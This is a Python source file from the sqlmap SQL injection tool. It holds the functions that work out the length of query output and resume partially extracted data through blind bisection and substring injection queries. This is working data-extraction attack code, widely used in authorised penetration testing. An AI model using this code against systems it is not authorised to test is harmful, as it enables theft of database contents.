#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://sqlmap.sourceforge.net/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToSessionFile
from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import getCompiledRegex
from lib.core.common import safeStringFormat
from lib.core.common import randomStr
from lib.core.common import replaceNewlineTabs
from lib.core.common import restoreDumpMarkedChars
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.unescaper import unescaper
from lib.techniques.blind.inference import bisection
from lib.core.settings import DUMP_START_MARKER
from lib.core.settings import DUMP_STOP_MARKER
from lib.core.settings import DUMP_DEL_MARKER

def queryOutputLength(expression, payload):
    """
    Returns the query output length.
    """

    lengthQuery         = queries[Backend.getIdentifiedDbms()].length.query
    select              = re.search("\ASELECT\s+", expression, re.I)
    selectTopExpr       = re.search("\ASELECT\s+TOP\s+[\d]+\s+(.+?)\s+FROM", expression, re.I)
    selectDistinctExpr  = re.search("\ASELECT\s+DISTINCT\((.+?)\)\s+FROM", expression, re.I)
    selectFromExpr      = re.search("\ASELECT\s+(.+?)\s+FROM", expression, re.I)
    selectExpr          = re.search("\ASELECT\s+(.+)$", expression, re.I)
    miscExpr            = re.search("\A(.+)", expression, re.I)

    if selectTopExpr or selectDistinctExpr or selectFromExpr or selectExpr:
        if selectTopExpr:
            regExpr = selectTopExpr.groups()[0]
        elif selectDistinctExpr:
            regExpr = selectDistinctExpr.groups()[0]
        elif selectFromExpr:
            regExpr = selectFromExpr.groups()[0]
        elif selectExpr:
            regExpr = selectExpr.groups()[0]
    elif miscExpr:
        regExpr = miscExpr.groups()[0]

    if ( select and re.search("\A(COUNT|LTRIM)\(", regExpr, re.I) ) or len(regExpr) <= 1:
        return None, None, None

    if selectDistinctExpr:
        lengthExpr = "SELECT %s FROM (%s)" % (lengthQuery % regExpr, expression)

        if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
            lengthExpr += " AS %s" % randomStr(lowercase=True)
    elif select:
        lengthExpr = expression.replace(regExpr, lengthQuery % regExpr, 1)
    else:
        lengthExpr = lengthQuery % expression

    infoMsg = "retrieving the length of query output"
    logger.info(infoMsg)

    output = resume(lengthExpr, payload)

    if output:
        return 0, output, regExpr

    dataToSessionFile("[%s][%s][%s][%s][" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], lengthExpr))

    start = time.time()
    lengthExprUnescaped = unescaper.unescape(lengthExpr)
    count, length = bisection(payload, lengthExprUnescaped, charsetType=2)

    debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    if length == " ":
        length = 0

    return count, length, regExpr

def resume(expression, payload):
    """
    This function can be called to resume part or entire output of a
    SQL injection query output.
    """

    try:
        if "sqlmapfile" in expression or "sqlmapoutput" in expression or conf.freshQueries:
            return None

        condition = (
                      kb.resumedQueries and conf.url in kb.resumedQueries
                      and expression in kb.resumedQueries[conf.url]
                    )

        if not condition:
            return None

        resumedValue = kb.resumedQueries[conf.url][expression]

        if not resumedValue:
            return None

        resumedValue = restoreDumpMarkedChars(resumedValue, True)

        if resumedValue[-1] == "]":
            resumedValue = resumedValue[:-1]

            infoMsg  = "read from file '%s': " % conf.sessionFile
            logValue = getCompiledRegex("%s(.*?)%s" % (DUMP_START_MARKER, DUMP_STOP_MARKER), re.S).findall(resumedValue)

            if logValue:
                if kb.technique == PAYLOAD.TECHNIQUE.UNION:
                    logValue = ", ".join([value.replace(DUMP_DEL_MARKER, ", ") for value in logValue])
                else:
                    return None
            else:
                logValue = resumedValue

            if "\n" in logValue:
                infoMsg += "%s..." % logValue.split("\n")[0]
            else:
                infoMsg += logValue

            if not kb.suppressResumeInfo:
                dataToStdout("[%s] [INFO] %s\n" % (time.strftime("%X"), infoMsg))

            return resumedValue

        # If we called this function without providing a payload it means
        # that we have called it from lib/request/inject __goInband() or
        # from __goError() function so we return to the calling function
        # so that the query output will be retrieved taking advantage
        # of either error-based or inband SQL injection vulnerability.
        if not payload:
            return None

        if not Backend.getIdentifiedDbms():
            return None

        substringQuery = queries[Backend.getIdentifiedDbms()].substring.query
        select = getCompiledRegex("\ASELECT ", re.I).search(expression)

        _, length, regExpr = queryOutputLength(expression, payload)

        if not length:
            return None

        if len(resumedValue) == int(length):
            infoMsg  = "read from file '%s': " % conf.sessionFile
            infoMsg += "%s" % resumedValue.split("\n")[0]
            logger.info(infoMsg)

            dataToSessionFile("[%s][%s][%s][%s][%s]\n" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(resumedValue)))

            return resumedValue
        elif len(resumedValue) < int(length):
            infoMsg  = "resumed from file '%s': " % conf.sessionFile
            infoMsg += "%s..." % resumedValue.split("\n")[0]
            logger.info(infoMsg)

            dataToSessionFile("[%s][%s][%s][%s][%s" % (conf.url, kb.injection.place, conf.parameters[kb.injection.place], expression, replaceNewlineTabs(resumedValue)))

            if select:
                newExpr = expression.replace(regExpr, safeStringFormat(substringQuery, (regExpr, len(resumedValue) + 1, int(length))), 1)
            else:
                newExpr = safeStringFormat(substringQuery, (expression, len(resumedValue) + 1, int(length)))

            missingCharsLength = int(length) - len(resumedValue)

            infoMsg  = "retrieving pending %d query " % missingCharsLength
            infoMsg += "output characters"
            logger.info(infoMsg)

            start = time.time()
            count, finalValue = bisection(payload, newExpr, length=missingCharsLength)

            debugMsg = "performed %d queries in %d seconds" % (count, calculateDeltaSeconds(start))
            logger.debug(debugMsg)

            if len(finalValue) != ( int(length) - len(resumedValue) ):
                warnMsg  = "the total length of the query is not "
                warnMsg += "right, sqlmap is going to retrieve the "
                warnMsg += "query value from the beginning now"
                logger.warn(warnMsg)

                return None

            return "%s%s" % (resumedValue, finalValue)

        return None
    except ValueError:
        errMsg = "invalid resume value for expression: '%s'" % expression
        logger.error(errMsg)
        return None
